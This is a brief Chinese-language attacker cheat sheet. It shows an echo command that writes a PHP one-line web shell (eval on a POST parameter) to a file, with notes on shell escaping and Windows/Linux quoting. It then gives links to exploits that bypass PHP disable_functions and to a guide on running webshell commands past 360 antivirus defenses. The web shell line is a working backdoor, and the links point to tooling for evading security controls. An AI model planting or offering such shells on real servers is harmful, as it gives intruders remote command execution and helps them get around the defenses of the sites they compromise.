# 01、echo写入php一句话木马
```
echo "<?php eval(\$_POST['cmd']);?>">1.php
1.php内容如下：
<?php eval($_POST['cmd']);?>

注意1：经过在burp下测试及bash下测试发现，echo "<?php eval($_POST['cmd']);?>">1.php的结果是<?php eval(['cmd']);?>

注意2：Windows下echo "bbb">3.txt时，会将双引号带入文件内容，Linux下echo "bbb">3.txt时，不会将双引号带入文件内容。
```

# 02、php绕过disable_functions
```
https://github.com/mm0r1/exploits/tree/master/php-filter-bypass
```

# 03、webshell下绕过360执行命令
```
Webshell绕过360主动防御执行命令
https://mp.weixin.qq.com/s/OGwo1zoN1LS3aYalZ_PePw
```